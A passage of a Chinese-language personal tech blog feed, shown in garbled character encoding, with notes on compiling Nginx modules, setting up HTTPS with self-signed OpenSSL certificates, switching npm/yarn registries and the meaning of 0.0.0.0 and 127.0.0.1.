ç¼“å­˜æ¸…ç†é…ç½®"></a>6.3.4 ç¼“å­˜æ¸…ç†é…ç½®</h3><h2 id="6-4-é‚®ä»¶æœåŠ¡"><a href="#6-4-é‚®ä»¶æœåŠ¡" class="headerlink" title="6.4 é‚®ä»¶æœåŠ¡"></a>6.4 é‚®ä»¶æœåŠ¡</h2><h1 id="ç¬¬7ç« -æ¨¡å—é…ç½®åº”ç”¨"><a href="#ç¬¬7ç« -æ¨¡å—é…ç½®åº”ç”¨" class="headerlink" title="ç¬¬7ç«  æ¨¡å—é…ç½®åº”ç”¨"></a>ç¬¬7ç«  æ¨¡å—é…ç½®åº”ç”¨</h1><h2 id="7-1-æ¨¡å—æ¦‚è¿°"><a href="#7-1-æ¨¡å—æ¦‚è¿°" class="headerlink" title="7.1 æ¨¡å—æ¦‚è¿°"></a>7.1 æ¨¡å—æ¦‚è¿°</h2><h3 id="7-1-1-æ¨¡å—åŒ–ç»“æ„è®¾è®¡"><a href="#7-1-1-æ¨¡å—åŒ–ç»“æ„è®¾è®¡" class="headerlink" title="7.1.1 æ¨¡å—åŒ–ç»“æ„è®¾è®¡"></a>7.1.1 æ¨¡å—åŒ–ç»“æ„è®¾è®¡</h3><h3 id="7-1-2-Nginx-æ¨¡å—åˆ†ç±»åŠåº”ç”¨"><a href="#7-1-2-Nginx-æ¨¡å—åˆ†ç±»åŠåº”ç”¨" class="headerlink" title="7.1.2 Nginx æ¨¡å—åˆ†ç±»åŠåº”ç”¨"></a>7.1.2 Nginx æ¨¡å—åˆ†ç±»åŠåº”ç”¨</h3><p>é€šå¸¸å°† Nginx åˆ†ä¸º 5 å¤§æ¨¡å—, åˆ†åˆ«ä¸º:</p><ul><li>æ ¸å¿ƒæ¨¡å—</li><li>æ ‡å‡† HTTP æ¨¡å—</li><li>å¯é€‰ HTTP æ¨¡å— </li><li>é‚®ä»¶æœåŠ¡æ¨¡å—</li><li>ç¬¬ä¸‰æ–¹æ¨¡å—</li></ul><p>æ ¸å¿ƒæ¨¡å—æ˜¯ Nginx æœåŠ¡å™¨æ­£å¸¸è¿è¡Œå¿…ä¸å¯å°‘çš„æ¨¡å—, å¦‚åŒæ“ä½œç³»ç»Ÿçš„å†…æ ¸. å®ƒæä¾›äº† Nginx æœ€åŸºæœ¬çš„ æ ¸å¿ƒæœåŠ¡.</p><p>æ ‡å‡† HTTP æ¨¡å—ç”¨äºæ”¯æŒæ ‡å‡† HTTP çš„ç›¸å…³åŠŸèƒ½, æ˜¯ç¼–è¯‘ Nginx æ—¶é»˜è®¤å®‰è£…çš„æ¨¡å—.</p><p>å¯é€‰ HTTP æ¨¡å—ä¸»è¦ç”¨äºæ‰©å±• HTTP åŠŸèƒ½.</p><p>é‚®ä»¶æœåŠ¡æ¨¡å—ä¸»è¦ç”¨äºæ”¯æŒé‚®ä»¶æœåŠ¡.</p><p>ç¬¬ä¸‰æ–¹æ¨¡å—æ˜¯ä¸ºäº†æ‰©å±• Nginx çš„åº”ç”¨.</p><p>Nginx çš„æ¨¡å—å‘½åè§„åˆ™, æ˜¯ä»¥ <code>ngx_</code> å¼€å¤´, ä»¥ <code>_module</code> ç»“å°¾.</p><p>å¦‚ <code>ngx_core_module</code> è¡¨ç¤ºè¯¥æ¨¡å—æä¾›çš„æ˜¯ Nginx çš„æ ¸å¿ƒåŠŸèƒ½.</p><h3 id="7-1-3-Nginx-æ‰‹å†Œçš„ä½¿ç”¨"><a href="#7-1-3-Nginx-æ‰‹å†Œçš„ä½¿ç”¨" class="headerlink" title="7.1.3 Nginx æ‰‹å†Œçš„ä½¿ç”¨"></a>7.1.3 Nginx æ‰‹å†Œçš„ä½¿ç”¨</h3><p>ä¸Š <a href="http://nginx.org/en/docs/">å®˜ç½‘</a>, Modules reference ä¸­æä¾›äº† Nginx æ‰€æœ‰æ¨¡å—ä»¥åŠæŒ‡ä»¤çš„ä½¿ç”¨.</p><p>åœ¨æŒ‡ä»¤æˆ–å˜é‡åç§°çš„åé¢, è‹¥æ ‡æ³¨äº†å…·ä½“çš„æ¨¡å—åç§°, å³è¡¨ç¤ºè¯¥æŒ‡ä»¤æˆ–å˜é‡åªèƒ½åœ¨æ­¤æ¨¡å—ä¸‹ä½¿ç”¨, æœªæ ‡æ³¨çš„åˆ™è¡¨ç¤ºé€šç”¨æŒ‡ä»¤å’Œå˜é‡.</p><h2 id="7-2-è°ƒè¯•è¾“å‡º"><a href="#7-2-è°ƒè¯•è¾“å‡º" class="headerlink" title="7.2 è°ƒè¯•è¾“å‡º"></a>7.2 è°ƒè¯•è¾“å‡º</h2><h3 id="7-2-1-è°ƒè¯•è¾“å‡ºçš„é…ç½®"><a href="#7-2-1-è°ƒè¯•è¾“å‡ºçš„é…ç½®" class="headerlink" title="7.2.1 è°ƒè¯•è¾“å‡ºçš„é…ç½®"></a>7.2.1 è°ƒè¯•è¾“å‡ºçš„é…ç½®</h3><p>ä½¿ç”¨ <code>echo-nginx-module</code> è¿™ä¸ªç¬¬ä¸‰æ–¹æ¨¡å—.</p><p>ä¸‹è½½, å…·ä½“æŸ¥çœ‹ <a href="https://github.com/openresty/echo-nginx-module#installation">github ä¸Šçš„ç›¸å…³éƒ¨åˆ†</a></p><h4 id="1-æŸ¥çœ‹å½“å‰-Nginx-ç‰ˆæœ¬åŠå…¶ç¼–è¯‘é€‰é¡¹"><a href="#1-æŸ¥çœ‹å½“å‰-Nginx-ç‰ˆæœ¬åŠå…¶ç¼–è¯‘é€‰é¡¹" class="headerlink" title="1. æŸ¥çœ‹å½“å‰ Nginx ç‰ˆæœ¬åŠå…¶ç¼–è¯‘é€‰é¡¹"></a>1. æŸ¥çœ‹å½“å‰ Nginx ç‰ˆæœ¬åŠå…¶ç¼–è¯‘é€‰é¡¹</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ nginx -V<br></code></pre></td></tr></table></figure><p>åœ¨åŸç¼–è¯‘é€‰é¡¹çš„åŸºç¡€ä¸Šæ·»åŠ å¯¹ echo æ¨¡å—çš„ç¼–è¯‘.</p><p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ./configure \<br>--prefix=/usr/local/nginx \<br>--with-http_ssl_module \ <br>--add-module=/root/echo-nginx-module<br>$ make<br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±æ˜¯é‡æ–°ç¼–è¯‘.</p><h4 id="3-å¤‡ä»½å¹¶å¤åˆ¶-nginx-çš„å¯æ‰§è¡Œæ–‡ä»¶"><a href="#3-å¤‡ä»½å¹¶å¤åˆ¶-nginx-çš„å¯æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="3. å¤‡ä»½å¹¶å¤åˆ¶ nginx çš„å¯æ‰§è¡Œæ–‡ä»¶"></a>3. å¤‡ä»½å¹¶å¤åˆ¶ nginx çš„å¯æ‰§è¡Œæ–‡ä»¶</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">cd</span> objs<br>$ <span class="hljs-built_in">mv</span> /usr/local/nginx/sbin/nginx /usr/local/nginx/sbin/nginx.bak<br>$ <span class="hljs-built_in">cp</span> nginx /usr/local/nginx/sbin/nginx<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>echo</code> æŒ‡ä»¤è¾“å‡ºå­—ç¬¦ä¸²:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> / &#123;<br>    <span class="hljs-attribute">root</span> html;<br>    <span class="hljs-attribute">index</span> index.html index.htm;<br>    <span class="hljs-attribute">default_type</span> text/plain;<br>    <span class="hljs-attribute">echo</span> <span class="hljs-string">&quot;This is an echo module.&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="7-2-2-å¸¸è§çš„åº”ç”¨æ¡ˆä¾‹"><a href="#7-2-2-å¸¸è§çš„åº”ç”¨æ¡ˆä¾‹" class="headerlink" title="7.2.2 å¸¸è§çš„åº”ç”¨æ¡ˆä¾‹"></a>7.2.2 å¸¸è§çš„åº”ç”¨æ¡ˆä¾‹</h3><p><code>echo-nginx-module</code> ä¸­æœ€å¸¸ç”¨çš„å°±æ˜¯ echo æŒ‡ä»¤, ä¸”è¯¥æŒ‡ä»¤åªèƒ½åœ¨ location å—æˆ– location å—ä¸‹ if æŒ‡ä»¤ä¸­ä½¿ç”¨.</p><h2 id="7-3-æŸ¥çœ‹å“åº”çŠ¶æ€ä¸å“åº”å†…å®¹"><a href="#7-3-æŸ¥çœ‹å“åº”çŠ¶æ€ä¸å“åº”å†…å®¹" class="headerlink" title="7.3 æŸ¥çœ‹å“åº”çŠ¶æ€ä¸å“åº”å†…å®¹"></a>7.3 æŸ¥çœ‹å“åº”çŠ¶æ€ä¸å“åº”å†…å®¹</h2><h3 id="7-3-1-å®‰è£…æ‰€éœ€æ¨¡å—"><a href="#7-3-1-å®‰è£…æ‰€éœ€æ¨¡å—" class="headerlink" title="7.3.1 å®‰è£…æ‰€éœ€æ¨¡å—"></a>7.3.1 å®‰è£…æ‰€éœ€æ¨¡å—</h3><p>åˆ©ç”¨ <code>ngx_http_stub_status_module</code> å’Œ <code>ngx_http_sub_module</code> æ¨¡å—.</p><p>åœ¨ <code>./configure</code> æ—¶æ·»åŠ :</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">--<span class="hljs-keyword">with</span>-http_stub_status_module <span class="hljs-string">\</span><br>--<span class="hljs-keyword">with</span>-http_sub_module<br></code></pre></td></tr></table></figure><h2 id="7-4-ç½‘é¡µå‹ç¼©ä¼ è¾“"><a href="#7-4-ç½‘é¡µå‹ç¼©ä¼ è¾“" class="headerlink" title="7.4 ç½‘é¡µå‹ç¼©ä¼ è¾“"></a>7.4 ç½‘é¡µå‹ç¼©ä¼ è¾“</h2><h3 id="7-4-1-gzip-å‹ç¼©æŠ€æœ¯"><a href="#7-4-1-gzip-å‹ç¼©æŠ€æœ¯" class="headerlink" title="7.4.1 gzip å‹ç¼©æŠ€æœ¯"></a>7.4.1 gzip å‹ç¼©æŠ€æœ¯</h3><p>gzip (GNU-ZIP) æ˜¯ä¸€ç§å‹ç¼©æŠ€æœ¯.</p><p>gzip ç½‘é¡µå‹ç¼©çš„å®ç°éœ€è¦æµè§ˆå™¨å’ŒæœåŠ¡å™¨çš„æ”¯æŒ:<br><img src="/../img/gzip_process.png" alt="gzip"></p><h3 id="7-4-2-ç½‘é¡µå‹ç¼©ä¼ è¾“é…ç½®"><a href="#7-4-2-ç½‘é¡µå‹ç¼©ä¼ è¾“é…ç½®" class="headerlink" title="7.4.2 ç½‘é¡µå‹ç¼©ä¼ è¾“é…ç½®"></a>7.4.2 ç½‘é¡µå‹ç¼©ä¼ è¾“é…ç½®</h3><p>ç›¸å…³é…ç½®æŒ‡ä»¤:<br><img src="/../img/gzip_directives1.png" alt="gzip directives"><br><img src="/../img/gzip_directives2.png" alt="gzip directives"></p><h2 id="7-5-é‡å†™ä¸é‡å®šå‘"><a href="#7-5-é‡å†™ä¸é‡å®šå‘" class="headerlink" title="7.5 é‡å†™ä¸é‡å®šå‘"></a>7.5 é‡å†™ä¸é‡å®šå‘</h2><h2 id="7-6-é˜²ç›—é“¾çš„é…ç½®"><a href="#7-6-é˜²ç›—é“¾çš„é…ç½®" class="headerlink" title="7.6 é˜²ç›—é“¾çš„é…ç½®"></a>7.6 é˜²ç›—é“¾çš„é…ç½®</h2><h2 id="7-7-é…ç½®-HTTPS-ç½‘ç«™"><a href="#7-7-é…ç½®-HTTPS-ç½‘ç«™" class="headerlink" title="7.7 é…ç½® HTTPS ç½‘ç«™"></a>7.7 é…ç½® HTTPS ç½‘ç«™</h2><p>æƒ³è¦å®ç° HTTPS åŠ å¯†ç½‘ç«™, åœ¨æœåŠ¡å™¨ç«¯é¦–å…ˆè¦è·å¾— CA (CertificationAuthority) è®¤è¯æœºæ„é¢å‘çš„æœåŠ¡å™¨æ•°å­—è¯ä¹¦ (CRT), ç„¶åæµè§ˆå™¨åœ¨å‘èµ· HTTPS è¯·æ±‚æ—¶ä¼šéªŒè¯æœåŠ¡å™¨çš„ CRT æ˜¯å¦åˆæ³•, è‹¥ä¸åˆæ³•åˆ™ç»™å‡ºä¸€ä¸ª warning æç¤ºä¿¡æ¯, è‹¥åˆæ³•, ç”¨æˆ·åœ¨ä¸ç½‘ç«™äº¤äº’æ—¶, æ‰€ä¼ è¾“çš„æ•°æ®éƒ½æ˜¯åŠ å¯†åçš„æ•°æ®.</p><p>Nginx æœåŠ¡å™¨ä¸­çš„ <code>ngx_http_ssl_module</code> æ¨¡å—ç”¨äºæä¾› HTTPS ç½‘ç«™çš„é…ç½®.</p><p>åœ¨å­¦ä¹ é˜¶æ®µ, Nginx æœåŠ¡å™¨è‹¥è¦è·å–æ•°å­—è¯ä¹¦, å¯ä»¥ä½¿ç”¨ OpenSSL å¼€æºè½¯ä»¶å°†è‡ªå·±ä½œä¸º CA ä¸ºè‡ªå·±é¢å‘è¯ä¹¦.</p><h3 id="7-7-2-é¢å‘è®¤è¯è¯ä¹¦"><a href="#7-7-2-é¢å‘è®¤è¯è¯ä¹¦" class="headerlink" title="7.7.2 é¢å‘è®¤è¯è¯ä¹¦"></a>7.7.2 é¢å‘è®¤è¯è¯ä¹¦</h3><p>OpenSSL æ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„å®‰å…¨å¥—æ¥å­—å±‚å¯†ç åº“, å®ƒåŒ…å«äº†ä¸»è¦çš„å¯†ç ç®—æ³•, å¸¸ç”¨çš„å¯†é’¥, è¯ä¹¦å°è£…ç®¡ç†ä»¥åŠ SSL åè®®, è¯ä¹¦ç­¾å‘ç­‰å¤šç§åŠŸèƒ½.</p><p>OpenSSL ç¨‹åºç”± 3 éƒ¨åˆ†ç»„æˆ:</p><ul><li>openssl å‘½ä»¤è¡Œå·¥å…·</li><li>libcrypto å…¬å…±åŠ å¯†åº“</li><li>libssl å®ç° SSL åè®®</li></ul><h4 id="1-ç”ŸæˆæœåŠ¡å™¨çš„-RSA-ç§é’¥"><a href="#1-ç”ŸæˆæœåŠ¡å™¨çš„-RSA-ç§é’¥" class="headerlink" title="1. ç”ŸæˆæœåŠ¡å™¨çš„ RSA ç§é’¥"></a>1. ç”ŸæˆæœåŠ¡å™¨çš„ RSA ç§é’¥</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">mkdir</span> /usr/local/nginx/conf/ssl<br>$ <span class="hljs-built_in">cd</span> /usr/local/nginx/conf/ssl<br>$ openssl genrsa -out server.key 2048<br></code></pre></td></tr></table></figure><p><code>openssl</code> çš„å‚æ•°åŠå«ä¹‰:</p><ul><li><code>genrsa</code>, ç”Ÿæˆ rsa ç§é’¥</li><li><code>-out server.key</code>, è¡¨ç¤ºè¾“å‡ºçš„æ–‡ä»¶åä¸º <code>server.key</code>, æ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸ºæ‰§è¡Œ <code>openssl</code> å‘½ä»¤æ—¶æ‰€åœ¨ç›®å½•</li><li><code>2048</code>, å¯†é’¥é•¿åº¦, è¶Šé•¿, å®‰å…¨æ€§è¶Šå¼º.</li></ul><h4 id="2-ç”ŸæˆæœåŠ¡å™¨çš„-CSR-è¯ä¹¦è¯·æ±‚æ–‡ä»¶"><a href="#2-ç”ŸæˆæœåŠ¡å™¨çš„-CSR-è¯ä¹¦è¯·æ±‚æ–‡ä»¶" class="headerlink" title="2. ç”ŸæˆæœåŠ¡å™¨çš„ CSR è¯ä¹¦è¯·æ±‚æ–‡ä»¶"></a>2. ç”ŸæˆæœåŠ¡å™¨çš„ CSR è¯ä¹¦è¯·æ±‚æ–‡ä»¶</h4><p>CSR æ˜¯ Certificate Signing Request çš„ç®€ç§° (ç›´æ¥ç¿»è¯‘è¿‡æ¥å°±æ˜¯ â€œè¯ä¹¦ç­¾å‘è¯·æ±‚â€ è¿™ä¸ªä¸œè¥¿å½“ä½œå…¬é’¥ç”¨, ä¹Ÿå°±æ˜¯ç”¨æ¥åŠ å¯†).</p><p>CSR è¯ä¹¦è¯·æ±‚æ–‡ä»¶æ˜¯æœåŠ¡å™¨çš„å…¬é’¥, ç”¨äºæäº¤ç»™ CA æœºæ„è¿›è¡Œç­¾å.</p><p>ç”Ÿæˆ CSR:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ openssl req -new -key server.key -out server.csr<br></code></pre></td></tr></table></figure><p><code>req</code> è¡¨ç¤ºè¯ä¹¦ç­¾å‘ç”³è¯·.</p><p><code>-new</code> è¡¨ç¤ºæ–°è¯·æ±‚.</p><p><code>-key server.key</code> æŒ‡å®šç§é’¥ä¸º <code>server.key</code>. k</p><p><code>-out server.csr</code> è¡¨ç¤ºç”Ÿæˆçš„ CSR è¯ä¹¦è¯·æ±‚æ–‡ä»¶åç§°ä¸º <code>server.csr</code>.<br><img src="/../img/csr_args.png" alt="openssl ç”Ÿæˆ CSR å‚æ•°å«ä¹‰"></p><p>è¿™é‡Œ, ç§é’¥ç”¨äºå¯¹æ•°æ®è¿›è¡Œæ•°å­—ç­¾å, ç­¾ååçš„æ•°æ®å¯ä»¥åˆ©ç”¨å…¬é’¥è¿›è¡ŒéªŒè¯.</p><h4 id="3-CA-ä¸ºæœåŠ¡å™¨è®¤è¯è¯ä¹¦"><a href="#3-CA-ä¸ºæœåŠ¡å™¨è®¤è¯è¯ä¹¦" class="headerlink" title="3. CA ä¸ºæœåŠ¡å™¨è®¤è¯è¯ä¹¦"></a>3. CA ä¸ºæœåŠ¡å™¨è®¤è¯è¯ä¹¦</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ openssl x509 -req -days 30 \<br>-<span class="hljs-keyword">in</span> server.car -signkey server.key -out server.crt<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ CA çš„ç§é’¥ <code>server.key</code> ä¸ºæœåŠ¡å™¨çš„ CSR è¯ä¹¦ç”³è¯·æ–‡ä»¶ <code>server.csr</code> è¿›è¡Œç­¾åè®¤è¯.</p><p><code>x509</code> æ˜¯ç­¾åè¯ä¹¦æ ¼å¼. <code>-days 30</code> ç”¨äºè®¾ç½®ç­¾å‘è¯ä¹¦çš„æœ‰æ•ˆæœŸ.</p><h3 id="7-7-3-é…ç½®-HTTPS-ç½‘ç«™"><a href="#7-7-3-é…ç½®-HTTPS-ç½‘ç«™" class="headerlink" title="7.7.3 é…ç½® HTTPS ç½‘ç«™"></a>7.7.3 é…ç½® HTTPS ç½‘ç«™</h3><p>éœ€è¦åœ¨ç¼–è¯‘å®‰è£… Nginx æ—¶æ·»åŠ å¯¹ <code>ngx_http_ssl_module</code> æ¨¡å—çš„æ”¯æŒ.</p><p>ç¤ºä¾‹ <code>nginx.conf</code> å†…å®¹:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">server &#123;<br>    listen <span class="hljs-number">443</span>;<br>    server_name www.test.com;<br>    root html/test.com;<br>    ssl on;<br>    ssl_certificate     <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>conf<span class="hljs-regexp">/ssl/</span>server.crt;<br>    ssl_certificate_key <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>conf<span class="hljs-regexp">/ssl/</span>server.key;<br>&#125;<br></code></pre></td></tr></table></figure><p>443 ç«¯å£ä¸“é—¨ç”¨äº HTTPS.</p><p><code>ssl on</code> å¼€å¯ Nginx å¯¹ SSL çš„æ”¯æŒ.</p><p><code>ssl_certificate</code> æŒ‡å®š CRT æ–‡ä»¶.</p><p><code>ssl_certificate_key</code> æŒ‡å®šæœåŠ¡å™¨ç§é’¥.</p>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å¯¹-Nginx-çš„ç†è§£</title>
    <link href="/2022/10/02/%E5%AF%B9-Nginx-%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <url>/2022/10/02/%E5%AF%B9-Nginx-%E7%9A%84%E7%90%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>å°±æ˜¯ä½ å‘è®¡ç®—æœºå‘èµ·ä¸€ä¸ªè¯·æ±‚, å³ä½ è¦æ‰“å¼€æŸå°ä¸»æœºä¸Šé¢çš„ä¸€ä¸ªé¡µé¢, Nginx å°±ä¼šè®©ä½ æ‰¾åˆ°è¿™ä¸ªé¡µé¢åœ¨å“ªé‡Œå¹¶ä¸”æŠŠå®ƒæ‰“å¼€.</p><h1 id="docker-å®¹å™¨çš„ä¾‹å­"><a href="#docker-å®¹å™¨çš„ä¾‹å­" class="headerlink" title="docker å®¹å™¨çš„ä¾‹å­"></a>docker å®¹å™¨çš„ä¾‹å­</h1><p>å®¹å™¨é‡Œé¢è¿è¡Œ Nginx æœåŠ¡å™¨. è¿™ä¸ª Nginx ç›‘å¬ 80 ç«¯å£, è€Œè¿™ä¸ª 80 ç«¯å£åˆæ˜¯æ˜ å°„åˆ°å®¿ä¸»æœºçš„ 49153 ç«¯å£, æ„æ€å°±æ˜¯, ä½ å‘å®¿ä¸»æœºçš„ 49153 ç«¯å£å‘èµ·çš„è¯·æ±‚ä¼šè¢«å®¹å™¨ä¸­çš„ Nginx æ‰€æ•è·. å°±è¾¾åˆ°äº†æ•ˆæœ.</p><h1 id="å…³äºé…ç½®æ–‡ä»¶"><a href="#å…³äºé…ç½®æ–‡ä»¶" class="headerlink" title="å…³äºé…ç½®æ–‡ä»¶"></a>å…³äºé…ç½®æ–‡ä»¶</h1><p>location å—é‡Œé¢çš„ <code>index</code> æ‰æ˜¯æ‰“å¼€é¡µé¢.</p>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-yarn</title>
    <link href="/2022/10/02/%E5%85%B3%E4%BA%8E-yarn/"/>
    <url>/2022/10/02/%E5%85%B3%E4%BA%8E-yarn/</url>
    
    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/267176704">å‚è€ƒ</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç®¡ç†-npm-çš„ç‰ˆæœ¬</title>
    <link href="/2022/10/02/%E7%AE%A1%E7%90%86-npm-%E7%9A%84%E7%89%88%E6%9C%AC/"/>
    <url>/2022/10/02/%E7%AE%A1%E7%90%86-npm-%E7%9A%84%E7%89%88%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<p><a href="https://stackoverflow.com/questions/47008159/how-to-downgrade-node-version">å‚è€ƒ</a><br>ä½¿ç”¨ <code>n</code> è¿™ä¸ªå·¥å…·:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ cnpm install -g n<br>$ n 6.10.3<br></code></pre></td></tr></table></figure><p><code>n</code> åé¢è·Ÿç‰ˆæœ¬å·.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>npm-å’Œ-yarn-æ¢æº</title>
    <link href="/2022/10/02/npm-%E5%92%8C-yarn-%E6%8D%A2%E6%BA%90/"/>
    <url>/2022/10/02/npm-%E5%92%8C-yarn-%E6%8D%A2%E6%BA%90/</url>
    
    <content type="html"><![CDATA[<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ yarn config get registry<br>$ yarn config <span class="hljs-built_in">set</span> registry <span class="hljs-string">&#x27;https://registry.npm.taobao.org&#x27;</span><br>$ npm config get registry<br>$ npm config <span class="hljs-built_in">set</span> registry <span class="hljs-string">&#x27;https://registry.npm.taobao.org&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="å‡ ä¸ªå¯èƒ½èƒ½ç”¨çš„æº"><a href="#å‡ ä¸ªå¯èƒ½èƒ½ç”¨çš„æº" class="headerlink" title="å‡ ä¸ªå¯èƒ½èƒ½ç”¨çš„æº"></a>å‡ ä¸ªå¯èƒ½èƒ½ç”¨çš„æº</h1><pre><code class="hljs">npm -----  https://registry.npmjs.org/cnpm ----  http://r.cnpmjs.org/taobao --  https://registry.npm.taobao.org/nj ------  https://registry.nodejitsu.com/rednpm -- http://registry.mirror.cqupt.edu.cn skimdb -- https://skimdb.npmjs.com/registry</code></pre><h1 id="yarn"><a href="#yarn" class="headerlink" title="yarn"></a>yarn</h1><p>åŸæœ¬çš„æºå¥½åƒæ˜¯ <code>https://registry.yarnpkg.com</code></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-0.0.0.0-å’Œ-127.0.0.1-è¿™ä¸¤ä¸ª-IP-åœ°å€</title>
    <link href="/2022/10/02/%E5%85%B3%E4%BA%8E-0-0-0-0-%E5%92%8C-127-0-0-1-%E8%BF%99%E4%B8%A4%E4%B8%AA-IP-%E5%9C%B0%E5%9D%80/"/>
    <url>/2022/10/02/%E5%85%B3%E4%BA%8E-0-0-0-0-%E5%92%8C-127-0-0-1-%E8%BF%99%E4%B8%A4%E4%B8%AA-IP-%E5%9C%B0%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/72988255">å‚è€ƒ1</a><br><a href="https://www.cnblogs.com/FengZeng666/p/12519377.html">å‚è€ƒ2</a></p><h1 id="å…³äº-0-0-0-0"><a href="#å…³äº-0-0-0-0" class="headerlink" title="å…³äº 0.0.0.0"></a>å…³äº <code>0.0.0.0</code></h1><p>åœ¨æœåŠ¡å™¨ä¸­, <code>0.0.0.0</code> æŒ‡æœ¬æœºä¸Šçš„æ‰€æœ‰ IPV4 åœ°å€. å¦‚æœä¸€ä¸ªä¸»æœºæœ‰ä¸¤ä¸ª IP åœ°å€, <code>192.168.1.1</code> å’Œ <code>10.1.2.1</code>, å¹¶ä¸”è¯¥ä¸»æœºä¸Šçš„ä¸€ä¸ªæœåŠ¡ç›‘å¬çš„åœ°å€æ˜¯ <code>0.0.0.0</code>, é‚£ä¹ˆä¸¤ä¸ª ip åœ°å€éƒ½èƒ½è®¿é—®åˆ°è¯¥æœåŠ¡. ä¹Ÿå°±æ˜¯è¯´, ç›‘å¬ <code>0.0.0.0</code> ç­‰åŒäºåŒæ—¶ç›‘å¬äº†ä¸¤ä¸ª ip.</p><p>åœ¨è·¯ç”±ä¸­, <code>0.0.0.0</code> è¡¨ç¤ºçš„æ˜¯é»˜è®¤è·¯ç”±, å³å½“è·¯ç”±è¡¨ä¸­æ²¡æœ‰æ‰¾åˆ°å®Œå…¨åŒ¹é…çš„è·¯ç”±æ—¶æ‰€å¯¹åº”çš„è·¯ç”±.</p><p>å½“ä¸€å°ä¸»æœºè¿˜æ²¡æœ‰è¢«åˆ†é…ä¸€ä¸ª IP åœ°å€çš„æ—¶å€™, ç”¨äºè¡¨ç¤ºä¸»æœºæœ¬èº«.</p><h1 id="å…³äº-127-0-0-1"><a href="#å…³äº-127-0-0-1" class="headerlink" title="å…³äº 127.0.0.1"></a>å…³äº <code>127.0.0.1</code></h1><p>é¦–å…ˆè¿™æ˜¯ä¸€ä¸ª IPV4 åœ°å€.</p><p>ç½‘ç»œå·ä¸º <code>127</code> çš„åœ°å€ (å³ä»¥ 127 å¼€å¤´çš„ ip) éƒ½è¢«ç§°ä¸ºå›ç¯åœ°å€ (Loopback Address). å…¶æ˜¯ä¸€ç§ IPV4 çš„ç‰¹æ®Šåœ°å€.</p><p>åœ¨ IPV4 ä¸‹çš„å›ç¯åœ°å€æ˜¯ <code>127.0.0.1</code>, åœ¨ IPV6 ä¸‹, è¡¨è¾¾ä¸º <code>::1</code></p><p>åœ¨ IPV4 ä¸‹ç”¨çš„æ˜¯ <code>ping 127.0.0.1</code> å‘½ä»¤.</p><p>åœ¨ IPV6 ä¸‹ç”¨çš„æ˜¯ <code>ping6 ::1</code> å‘½ä»¤.</p><h2 id="ä»€ä¹ˆæ˜¯-ping"><a href="#ä»€ä¹ˆæ˜¯-ping" class="headerlink" title="ä»€ä¹ˆæ˜¯ ping"></a>ä»€ä¹ˆæ˜¯ ping</h2><p>ping æ˜¯åº”ç”¨å±‚å‘½ä»¤.</p><p>ping åº”ç”¨çš„åº•å±‚, ç”¨çš„æ˜¯ç½‘ç»œå±‚çš„ ICMP åè®®.</p><p>æœ¬è´¨ä¸Š, ping 